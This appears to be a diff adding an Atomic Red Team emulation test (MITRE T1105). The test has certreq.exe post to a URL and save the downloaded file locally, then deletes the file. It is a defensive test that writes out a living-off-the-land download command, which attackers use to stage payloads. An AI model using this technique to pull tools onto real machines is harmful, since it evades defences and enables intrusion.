@@ -1,0 +1,58 @@
+{
+  "id": "6fdaae87-c05b-42f8-842e-991a74e8376b",
+  "name": "certreq download",
+  "description": "Use certreq to download a file from the web",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "ef9434df-4dec-418d-8d20-61e56ff205af",
+      "type": "execute-command",
+      "data": {
+        "command": "certreq.exe -Post -config #{remote_file} c:\\windows\\win.ini #{local_path}",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "d6b33345-4c1c-4f55-bff2-af2bf46d8d1a",
+      "type": "execute-command",
+      "data": {
+        "command": "del #{local_path} \u003enul 2\u003e\u00261",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "ef9434df-4dec-418d-8d20-61e56ff205af",
+      "p": "on-success",
+      "o": "d6b33345-4c1c-4f55-bff2-af2bf46d8d1a"
+    },
+    {
+      "s": "ef9434df-4dec-418d-8d20-61e56ff205af",
+      "p": "on-failure",
+      "o": "d6b33345-4c1c-4f55-bff2-af2bf46d8d1a"
+    }
+  ],
+  "tags": [
+    "T1105",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "local_path",
+      "type": "string",
+      "description": "Local path to place file",
+      "value": "%temp%\\Atomic-license.txt"
+    },
+    {
+      "name": "remote_file",
+      "type": "url",
+      "description": "URL of file to copy",
+      "value": "https://example.com"
+    }
+  ]
+}
